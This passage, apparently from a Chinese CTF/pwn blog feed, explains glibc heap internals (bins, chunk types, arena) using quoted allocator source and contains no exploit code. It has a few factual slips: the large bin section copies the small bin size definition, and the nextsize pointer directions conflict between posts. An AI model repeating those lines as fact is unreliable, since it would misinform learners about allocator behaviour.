<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free()</span></span><br><span class="line"><span class="comment">  that triggers automatic consolidation of possibly-surrounding</span></span><br><span class="line"><span class="comment">  fastbin chunks. This is a heuristic, so the exact value should not</span></span><br><span class="line"><span class="comment">  matter too much. It is defined at half the default trim threshold as a</span></span><br><span class="line"><span class="comment">  compromise heuristic to only attempt consolidation if it is likely</span></span><br><span class="line"><span class="comment">  to lead to trimming. However, it is not dynamically tunable, since</span></span><br><span class="line"><span class="comment">  consolidation reduces fragmentation surrounding large chunks even</span></span><br><span class="line"><span class="comment">  if trimming is not used.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">  chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">  threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Unless max_fast is 0, we don't know if there are fastbins</span></span><br><span class="line"><span class="comment">  bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">  has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">  don't want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">  consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">  is reached.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>contiguous(M)</code></p>
<ul>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous</span></span><br><span class="line"><span class="comment">regions.  Otherwise, contiguity is exploited in merging together,</span></span><br><span class="line"><span class="comment">when possible, results from consecutive MORECORE calls.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The initial value comes from MORECORE_CONTIGUOUS, but is</span></span><br><span class="line"><span class="comment">changed dynamically if mmap is ever used as an sbrk substitute.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NONCONTIGUOUS_BIT     (2U)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> contiguous(M)          (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0)</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ol>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Pwn</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>heap - 3 - bins分类</title>
    <url>/2020/04/heap-3-bins/</url>
    <content><![CDATA[<p>存放free chunks的链表 ——— bins !</p>
<h2 id="1-bin链的介绍">1. bin链的介绍</h2>
<ul>
<li>bin链是由<code>struct chunk</code>组成的链表</li>
<li>不同的chunk根据不同的特点将它们区分开，为了便于分开管理，glibc引入了bin链这个概念</li>
<li>bin链上的chunk都是free chunk</li>
<li>bin链都是由当前线程的arena管理的</li>
</ul>
<h2 id="2-bin链的分类">2. bin链的分类</h2>
<ol>
<li>Fast bin</li>
<li>Small bin</li>
<li>Unsorted bin</li>
<li>Large bin</li>
</ol>
<a id="more"></a>
<ul>
<li>
<p>关系如下</p>
<pre class="mermaid">  graph TB
total[Total Bins] --> fast[Fast bins]
total --> bins[Bins]
bins --> small[Small bins]
bins --> unsorted[Unsorted bins]
bins --> large[Large bins]</pre>
</li>
</ul>
<h2 id="3-bin链的存储">3. bin链的存储</h2>
<ul>
<li>
<p>bin链存储在arena里，详细代码如下</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">/* Other members ... */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Fastbins */</span></span><br><span class="line">mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Other members ... */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>fast bin存储于arena.fastbinY数组中</p>
</li>
<li>
<p>small bin、 unsorted bin以及large bin都存储于arena的bins数组中</p>
</li>
</ul>
<h2 id="4-Fast-bin">4. Fast bin</h2>
<h3 id="介绍">介绍</h3>
<ul>
<li>
<p>glibc的介绍</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Fastbins</span><br><span class="line"></span><br><span class="line">An array of lists holding recently freed small chunks.  Fastbins</span><br><span class="line">are not doubly linked.  It is faster to single-link them, and</span><br><span class="line">since chunks are never removed from the middles of these lists,</span><br><span class="line">double linking is not necessary. Also, unlike regular bins, they</span><br><span class="line">are not even processed in FIFO order (they use faster LIFO) since</span><br><span class="line">ordering doesn&#39;t much matter in the transient contexts in which</span><br><span class="line">fastbins are normally used.</span><br><span class="line"></span><br><span class="line">Chunks in fastbins keep their inuse bit set, so they cannot</span><br><span class="line">be consolidated with other free chunks. malloc_consolidate</span><br><span class="line">releases all chunks in fastbins and consolidates them with</span><br><span class="line">other free chunks.</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>设计fast bin的初衷就是进行快速的小内存分配和释放</p>
</li>
<li>
<p>chunk大小 小于64(0x40)（32位）/ 128(0x80)（64位）字节的free chunk为fast chunk，其由fast bin管理<br>
该大小是在<code>malloc_init_state</code>函数中设置的<br>
其默认值为<code>(DEFAULT_MXFAST + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK</code><br>
相关代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFAULT_MXFAST     (64 * SIZE_SZ / 4)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_max_fast(s) \</span></span><br><span class="line">  global_max_fast = (((s) == <span class="number">0</span>)      \</span><br><span class="line">                    ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="line">#define get_max_fast() global_max_fast</span><br><span class="line"></span><br><span class="line">#define MALLOC_ALIGNMENT       (<span class="number">2</span> *SIZE_SZ)</span><br><span class="line"><span class="comment">/* The corresponding bit mask value */</span></span><br><span class="line">#define MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>fast bin链共有10条</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The maximum fastbin request size we support */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFASTBINS  (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>fast bin的分组依据fast chunk的大小<br>
两个相邻bin链里的chunk最大值相差8字节（32位）或16字节（64位）</p>
<ul>
<li>
<p>以64字节为例<br>
<code>fastbinY[0]</code>指向的chunk大小为0x20 - 0x30<br>
<code>fastbinY[1]</code>指向的chunk大小为0x30 - 0x40<br>
<code>......</code><br>
<code>fastbinY[5]</code>指向的chunk大小为0x70 - 0x80</p>
</li>
<li>
<p>相关代码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line">    ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h3 id="特点">特点</h3>
<ul>
<li><strong>LIFO</strong>（后进先出, 从链头取出 / 插入chunk），更快速的分配chunk</li>
<li><strong>单向</strong> 链表，fast chunk只使用fd指针指向下一个fast chunk，其bk指针置空</li>
<li>属于fast bin的chunk的PREV_INUSE位 <strong>总是设置为1</strong> ，以保证当前fast chunk不会被其他free chunks合并</li>
</ul>
<h2 id="5-Bins">5. Bins</h2>
<ul>
<li>
<p>glibc的介绍</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Bins</span><br><span class="line"></span><br><span class="line">An array of bin headers for free chunks. Each bin is doubly</span><br><span class="line">linked.  The bins are approximately proportionally (log) spaced.</span><br><span class="line">There are a lot of these bins (128). This may look excessive, but</span><br><span class="line">works very well in practice.  Most bins hold sizes that are</span><br><span class="line">unusual as malloc request sizes, but are more usual for fragments</span><br><span class="line">and consolidated sets of chunks, which is what these bins hold, so</span><br><span class="line">they can be found quickly.  All procedures maintain the invariant</span><br><span class="line">that no consolidated chunk physically borders another one, so each</span><br><span class="line">chunk in a list is known to be preceeded and followed by either</span><br><span class="line">inuse chunks or the ends of memory.</span><br><span class="line"></span><br><span class="line">Chunks in bins are kept in size order, with ties going to the</span><br><span class="line">approximately least recently used chunk. Ordering isn&#39;t needed</span><br><span class="line">for the small bins, which all contain the same-sized chunks, but</span><br><span class="line">facilitates best-fit allocation for larger chunks. These lists</span><br><span class="line">are just sequential. Keeping them in order almost never requires</span><br><span class="line">enough traversal to warrant using fancier ordered data</span><br><span class="line">structures.</span><br><span class="line"></span><br><span class="line">Chunks of the same size are linked with the most</span><br><span class="line">recently freed at the front, and allocations are taken from the</span><br><span class="line">back.  This results in LRU (FIFO) allocation order, which tends</span><br><span class="line">to give each chunk an equal opportunity to be consolidated with</span><br><span class="line">adjacent freed chunks, resulting in larger free chunks and less</span><br><span class="line">fragmentation.</span><br><span class="line"></span><br><span class="line">To simplify use in double-linked lists, each bin header acts</span><br><span class="line">as a malloc_chunk. This avoids special-casing for headers.</span><br><span class="line">But to conserve space and improve locality, we allocate</span><br><span class="line">only the fd&#x2F;bk pointers of bins, and then use repositioning tricks</span><br><span class="line">to treat these as the fields of a malloc_chunk*.</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>bin链共有128条</p>
<ul>
<li>
<p>相关代码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NBINS             128</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// in struct malloc_state</span></span><br><span class="line"><span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br></pre></td></tr></table></figure>
</li>
</ul>
<blockquote>
<p>为什么arena中，bins数组的大小为 NBINS * 2 - 2 呢？<br>
因为每个bin链在bins数组中存储的是一个指针fd指针和一个bk指针，即两个malloc chunk指针，所以要NBINS * 2<br>
又因为数组bins中索引为0、1的指针是不使用的，所以要减去2</p>
<blockquote>
<p>例： bins[2]为unsorted bin链的fd成员，bin[3]为其bk成员</p>
</blockquote>
</blockquote>
</li>
</ul>
<h3 id="1-Unsorted-bin">1. Unsorted bin</h3>
<h4 id="介绍-2">介绍</h4>
<ul>
<li>
<p>glibc的介绍</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Unsorted chunks</span><br><span class="line"></span><br><span class="line">All remainders from chunk splits, as well as all returned chunks,</span><br><span class="line">are first placed in the &quot;unsorted&quot; bin. They are then placed</span><br><span class="line">in regular bins after malloc gives them ONE chance to be used before</span><br><span class="line">binning. So, basically, the unsorted_chunks list acts as a queue,</span><br><span class="line">with chunks being placed on it in free (and malloc_consolidate),</span><br><span class="line">and taken off (to be either used or placed in bins) in malloc.</span><br><span class="line"></span><br><span class="line">The NON_MAIN_ARENA flag is never set for unsorted chunks, so it</span><br><span class="line">does not have to be taken into account in size comparisons.</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>被用户释放的allocated chunk，以及分割其他free chunk产生的剩余free chunk，都会被放置进unsorted bin里</p>
</li>
<li>
<p>其主要目的是为了让 <em>glibc malloc机制</em> 能够有第二次机会重新利用最近释放的chunk</p>
</li>
<li>
<p>unsorted bin只有 <strong>一个</strong>，位于arena中的 <strong>bin[1]</strong> 。 <strong>任何大小</strong> 的chunk都可加入unsorted bin中</p>
</li>
</ul>
<h4 id="特点-2">特点</h4>
<ul>
<li><strong>无序双向</strong> 链表</li>
<li><strong>FIFO</strong>（从链尾取出chunk，从链头插入chunk）</li>
</ul>
<h3 id="2-Small-bin">2. Small bin</h3>
<h4 id="介绍-3">介绍</h4>
<ul>
<li>
<p>chunk大小 小于512(0x200)（32位）/ 1024(0x400)（64位）字节的free chunk为small chunk，其由small bin管理</p>
<ul>
<li>
<p>相关代码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NSMALLBINS         64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> in_smallbin_range(sz)  \</span></span><br><span class="line">  ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) MIN_LARGE_SIZE)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p>small bin共有62个</p>
</li>
<li>
<p>small bin的分组依据small chunk的大小<br>
两个相邻bin链里的chunk最大值相差8字节（32位）或16字节（64位）,<br>
与fastbin的分组策略相同</p>
<ul>
<li>
<p>以64字节为例<br>
索引为<code>2</code>中chunk大小为0x20 - 0x30<br>
索引为<code>3</code>里的chunk大小为0x30 - 0x40<br>
<code>......</code><br>
索引为<code>63</code>里的chunk大小为0x3F0 - 0x400</p>
</li>
<li>
<p>相关代码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line">  ((SMALLBIN_WIDTH == <span class="number">16</span> ? (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">4</span>) : (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">3</span>))\</span><br><span class="line">  + SMALLBIN_CORRECTION)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h4 id="特点-3">特点</h4>
<ul>
<li><strong>无序双向</strong> 链表</li>
<li><strong>FIFO</strong>（从链尾取出chunk，从链头插入chunk）</li>
<li>就内存的分配和释放速度而言，small bin比large bin快，但比fast bin慢</li>
</ul>
<h3 id="3-Large-bin">3. Large bin</h3>
<h4 id="介绍-4">介绍</h4>
<ul>
<li>
<p>chunk大小 小于512(0x200)（32位）/ 1024(0x400)（64位）字节的free chunk为small chunk，其由small bin管理</p>
</li>
<li>
<p>large bin共有64个</p>
</li>
<li>
<p>large bin的分组同样依据large chunk的大小，不过稍有不同</p>
<ul>
<li>
<p>large bin 大体上分为6大组，其中每个大组里都有若干小组（此处不再展开，笔者想偷懒了QwQ）</p>
</li>
<li>
<p>相关源代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 2^6 = 64 ; 2^9 = 512 ; 2^12 = 4096 ; 2^15 = 32768 ;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_32(sz)                                                \</span></span><br><span class="line">  (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">38</span>) ?  <span class="number">56</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) :\</span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>) ?  <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) :\</span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>) ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) :\</span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>) ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) :\</span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>) ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) :\</span><br><span class="line">  <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_32_big(sz)                                            \</span></span><br><span class="line">  (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">45</span>) ?  <span class="number">49</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) :\</span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>) ?  <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) :\</span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>) ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) :\</span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>) ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) :\</span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>) ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) :\</span><br><span class="line">  <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// XXX It remains to be seen whether it is good to keep the widths of</span></span><br><span class="line"><span class="comment">// XXX the buckets the same or whether it should be scaled by a factor</span></span><br><span class="line"><span class="comment">// XXX of two as well.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_64(sz)                                                \</span></span><br><span class="line">  (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">48</span>) ?  <span class="number">48</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) :\</span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>) ?  <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) :\</span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>) ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) :\</span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>) ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) :\</span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>) ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) :\</span><br><span class="line">  <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index(sz) \</span></span><br><span class="line">  (SIZE_SZ == <span class="number">8</span> ? largebin_index_64 (sz)                                     \</span><br><span class="line">  : MALLOC_ALIGNMENT == <span class="number">16</span> ? largebin_index_32_big (sz)                     \</span><br><span class="line">  : largebin_index_32 (sz))</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p>large bin相对于small bin和fast bin来讲，比较特殊<br>
在一条large bin链里，free chunks的大小并不相同，所以</p>
<ul>
<li>large chunk中有两个特殊的指针
<ul>
<li>指针fd_nextsize : 该指针指向下一个大小更小的chunk（注意可能不是相邻chunk）</li>
<li>指针bk_nextsize : 该指针指向上一个大小更大的chunk（注意可能不是相邻chunk）</li>
<li>一个例子<br>
<img src="/2020/04/heap-3-bins/large-bin.png" alt="img"></li>
</ul>
</li>
<li>large bin上chunks是按大小排列的
<ul>
<li>从链头(bin处) 到 链尾，沿着各个chunk的fd指针，chunks大小从高到低，依次排序</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="特点-4">特点</h4>
<ul>
<li><strong>有序双向</strong> 链表，有序插入和取出chunks</li>
</ul>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Pwn</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>heap - 2 - chunk的分类</title>
    <url>/2020/03/heap-2-chunks/</url>
    <content><![CDATA[<p>堆块最小分配的单位 —— malloc_chunk !</p>
<h2 id="1-chunk的结构体">1. chunk的结构体</h2>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<ul>
<li>结构成员
<ul>
<li>通用结构成员
<ul>
<li><code>struct malloc_chunk</code>是每次分配堆块的基本单位</li>
<li><code>prev_size</code> 为上一个 <strong>空闲</strong> 相邻堆块（<strong>虚拟</strong> 内存中相邻，<strong>非</strong> bin链中相邻，下同）的chunk大小
<ul>
<li>如果上一个相邻堆块 <strong>不空闲</strong> ，则该变量无用</li>
<li>那么，该变量的空间可以给上一个堆块使用，即 <strong>空间复用</strong></li>
</ul>
</li>
<li><code>size</code>为当前chunk的大小（该变量可 <strong>&amp;</strong> 上各种标志位以记录数据，例如PREV_INUSE标志位）</li>
<li>指针<code>fd</code>指向下一个chunk（当该chunk位于链尾时指向<code>arena</code>）</li>
<li>指针<code>bk</code>指向上一个chunk（当该chunk位于链头时指向<code>arena</code>，fast chunks除外）</li>
</ul>
</li>
<li>当这个chunk为 <strong>large chunk</strong> 时，才会使用以下结构成员
<ul>
<li><code>fd_nextsize</code>指向大于当前chunk大小、且位于相同large bin链的chunk</li>
<li><code>bk_nextsize</code>指向小于当前chunk大小、且位于相同large bin链的chunk</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="2-allocated-chunk">2. allocated chunk</h2>
<ul>
<li>
<p>为便于称呼，我们称，已被分配给用户的chunk为allocated chunk</p>
</li>
<li>
<p>当free chunk被分配时，返回给用户的指针为 <strong>该chunk首地址 + 2 x SIZE_SZ</strong><br>
即该chunk的成员fd指针的地址</p>
<ul>
<li><code>SIZE_SZ</code>为<code>size_t</code>的大小<br>
在32位程序中<code>SIZE_SE</code>为4字节、64位程序中为8字节
<ul>
<li>
<p>其代码为</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> INTERNAL_SIZE_T</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INTERNAL_SIZE_T size_t</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The corresponding word size */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_SZ                (sizeof(INTERNAL_SIZE_T))</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>当chunk被分配时，指针fd、bk、fd_nextsize、bk_nextsize 无用，故该部分空间被分配给用户使用，用户所得到内存空间从指针fd的内存地址开始</p>
</li>
</ul>
<h2 id="2-free-chunk">2. free chunk</h2>
<ul>
<li><strong>free chunk</strong>， 指的是已经被操作系统释放的空闲chunk</li>
<li>不同于allocated chunk，此时该free chunk的指针fd、bk等有作用，不可被随意覆盖、</li>
</ul>
<h2 id="3-top-chunk">3. top chunk</h2>
<ul>
<li>地址最高、位于堆顶的的free chunk，称为top chunk</li>
<li>该 chunk <strong>不属于</strong> 任何bin，只由arena直接管理</li>
<li>当所有free chunk都无法满足用户需求时，如果top chunk够大，则top chunk将会被切割为两部分，第一部分分配给用户，第二部分会成为新的top chunk</li>
</ul>
<h2 id="4-last-remainder-chunk">4. last remainder chunk</h2>
<ul>
<li>当用户请求的是一个small chunk，并且该请求无法被small bin和unsorted bin满足</li>
<li>此时查找最合适的chunk，并把该chunk切割，剩余部分放入unsorted bin里并成为新的last remainder</li>
</ul>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Pwn</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>heap - 1 - arena</title>
    <url>/2020/03/heap-1-arena/</url>
    <content><![CDATA[<p>堆的 <strong>管理者</strong></p>
<h2 id="1-什么是-arena">1. 什么是 arena</h2>
<p>堆，是内存分配所用的内存，在计算机世界中是一种比较复杂的部件，里面有大量的信息需要被管理<br>
而<code>arena</code>，就是管理堆的一个结构</p>
<h2 id="2-arena-的特点">2. arena 的特点</h2>
<p>一个线程只有一个<code>arena</code>，这些<code>arena</code>是互不相同的。<br>
主线程的<code>arena</code>称为<code>main_arena</code>，子线程的<code>arena</code>称为<code>thread_arena</code>。</p>
<a id="more"></a>
<h2 id="3-arena-的数量限制">3. arena 的数量限制</h2>
<p>并不是每个线程都有一个<code>arena</code>，其个数是有限制的。</p>
<blockquote>
<p>由于笔者在写这篇文章时，所涉猎的堆漏洞类型暂时没有涉及arena的其他知识，故此处留坑。</p>
</blockquote>
<h2 id="4-arena-的实现">4. arena 的实现</h2>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   ----------- Internal state representation and initialization -----------</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="keyword">mutex_t</span> mutex;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span 